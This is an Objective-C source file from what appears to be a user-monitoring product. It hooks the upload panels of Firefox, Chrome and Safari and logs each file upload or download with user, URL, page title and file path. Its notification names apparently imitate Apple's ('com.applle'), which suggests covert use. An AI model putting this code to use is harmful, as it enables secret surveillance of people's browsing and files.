//
//  InternetFileUploadDownloadCapture.m
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "InternetFileUploadDownloadCapture.h"
#import "BrowserUploadFilePanelMonitor.h"

#import "SystemUtilsImpl.h"
#import "DateTimeFormat.h"
#import "FxFileTransferEvent.h"
#import "DefStd.h"
#import "PageInfo.h"
#import "PageVisitedNotifier.h"
#import "MessagePortIPCSender.h"

const int kDownloadDirection = 0;
const int kUploadDirection   = 1;

@implementation InternetFileUploadDownloadCapture

@synthesize mQueue, mThread;
@synthesize mDelegate, mSelector;

- (id) init {
    self = [super init];
    if (self) {
        mQueue = [[NSOperationQueue alloc] init];
        mQueue.maxConcurrentOperationCount = 1;
        mFireFoxPanelMonitor = [[BrowserUploadFilePanelMonitor alloc] initWithTargetBundleIdentifier:@"org.mozilla.firefox"];
        mChromePanelMonitor = [[BrowserUploadFilePanelMonitor alloc] initWithTargetBundleIdentifier:@"com.google.Chrome"];
        mSafariPanelMonitor = [[BrowserUploadFilePanelMonitor alloc] initWithTargetBundleIdentifier:@"com.apple.Safari"];
        mPageNotifier = [[PageVisitedNotifier alloc] initWithPageVisitedDelegate:self];
    }
    return self;
}

#pragma mark - Start or Stop

-(void)startCapture {
    DLog(@"startCapture");
    if (mIFTSocketReader == nil) {
        mIFTSocketReader = [[SocketIPCReader alloc] initWithPortNumber:55502 andAddress:kLocalHostIP withSocketDelegate:self];
        [mIFTSocketReader start];
    }
    
    [mFireFoxPanelMonitor startMonitor];
    [mChromePanelMonitor startMonitor];
    [mSafariPanelMonitor startMonitor];
    
    [mPageNotifier startNotify];
    
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.ift.enable"), (void *)self, nil, kCFNotificationDeliverImmediately);
}

-(void)stopCapture {
    DLog(@"stopCapture");
    if (mIFTSocketReader != nil) {
        [mIFTSocketReader release];
        mIFTSocketReader = nil;
    }
    
    [mFireFoxPanelMonitor stopMonitor];
    [mChromePanelMonitor stopMonitor];
    [mSafariPanelMonitor stopMonitor];
    
    [mPageNotifier stopNotify];
    
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.ift.disable"), (void *)self, nil, kCFNotificationDeliverImmediately);
}

#pragma mark - Socket

- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
    if (aRawData) {
        [self.mQueue addOperation:[NSBlockOperation blockOperationWithBlock:^{
            [self receivedFileUploadDownloadData:aRawData];
        }]];
    }
}

#pragma mark - Page

- (void) pageVisited: (PageInfo *) aPageVisited {
    if ([aPageVisited.mApplicationID isEqualToString:@"org.mozilla.firefox"]) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSNumber *pid = [NSNumber numberWithInt:aPageVisited.mPID];
            NSDictionary *userInfo = @{@"title":aPageVisited.mTitle, @"url":aPageVisited.mUrl, @"pid":pid};
            DLog(@">>>>>>> userInfo : %@", userInfo);
            
            MessagePortIPCSender* messagePort = [[MessagePortIPCSender alloc] initWithPortName:@"FirefoxPageMsgPort"];
            [messagePort writeDataToPort:[NSArchiver archivedDataWithRootObject:userInfo]];
            [messagePort release];
        });
    }
}

#pragma mark - Private methods

- (void) receivedFileUploadDownloadData:(NSData *) aUDData {
    DLog(@"Did received file upload or download");
    if ([self.mDelegate respondsToSelector:self.mSelector]) {
        NSString * info = [[[NSString alloc] initWithData:aUDData encoding:NSUTF8StringEncoding] autorelease];
        if (info) {
            NSArray * spliter = [info componentsSeparatedByString:@"|"];
            int direction         = [[spliter objectAtIndex:0] intValue];
            NSString * cUser      = [spliter objectAtIndex:1];
            NSString * appID      = [spliter objectAtIndex:2];
            NSString * appName    = [spliter objectAtIndex:3];
            NSString * url        = [spliter objectAtIndex:4];
            NSString * title      = [spliter objectAtIndex:5];
            NSString * filename   = [spliter objectAtIndex:6];
            NSString * pathTofile = [spliter objectAtIndex:7];
            
            NSNumberFormatter *nf = [[[NSNumberFormatter alloc] init] autorelease];
            nf.numberStyle = NSNumberFormatterDecimalStyle;
            NSNumber *fileSize = [nf numberFromString:[spliter objectAtIndex:8]];
            
            DLog(@"============ receivedFileUploadDownloadData =============");
            DLog(@"Direction    :%d",direction);
            DLog(@"CurrentUser  :%@",cUser);
            DLog(@"AppID        :%@",appID);
            DLog(@"App          :%@",appName);
            DLog(@"URL          :%@",url);
            DLog(@"Title        :%@",title);
            DLog(@"Path         :%@",pathTofile);
            DLog(@"FileName     :%@",filename);
            DLog(@"FileSize     :%@",fileSize);
            DLog(@"===========================================================");
            
            FxFileTransferEvent *fileTransferEvent = [[FxFileTransferEvent alloc] init];
            [fileTransferEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [fileTransferEvent setMUserLogonName:cUser];
            [fileTransferEvent setMApplicationID:appID];
            [fileTransferEvent setMApplicationName:appName];
            [fileTransferEvent setMTitle:title];
            
            if ([url rangeOfString:@"http"].location != NSNotFound ||
                [url rangeOfString:@"https"].location != NSNotFound ) {
                [fileTransferEvent setMTransferType:kFileTransferTypeHTTP_HTTPS];
            }else{
                [fileTransferEvent setMTransferType:kFileTransferTypeUnknown];
            }
            
            if (direction == kUploadDirection) {
                [fileTransferEvent setMDirection:kEventDirectionOut];
                [fileTransferEvent setMSourcePath:[NSString stringWithFormat:@"%@/%@",pathTofile,filename]];
                [fileTransferEvent setMDestinationPath:url];
            }else if (direction == kDownloadDirection) {
                [fileTransferEvent setMDirection:kEventDirectionIn];
                [fileTransferEvent setMSourcePath:url];
                [fileTransferEvent setMDestinationPath:[NSString stringWithFormat:@"%@/%@",pathTofile,filename]];
            }
            
            [fileTransferEvent setMFileName:filename];
            [fileTransferEvent setMFileSize:(NSUInteger)fileSize.unsignedLongLongValue];
            
            [self.mDelegate performSelector:self.mSelector
                                   onThread:self.mThread
                                 withObject:fileTransferEvent
                              waitUntilDone:NO];
            
            [fileTransferEvent release];
        }
    }
}

#pragma mark - Destroy

- (void) dealloc {
    [self stopCapture];
    
    [mPageNotifier release];
    
    [mFireFoxPanelMonitor release];
    [mChromePanelMonitor release];
    [mSafariPanelMonitor release];
    
    [mQueue release];
    
    [super dealloc];
}
@end
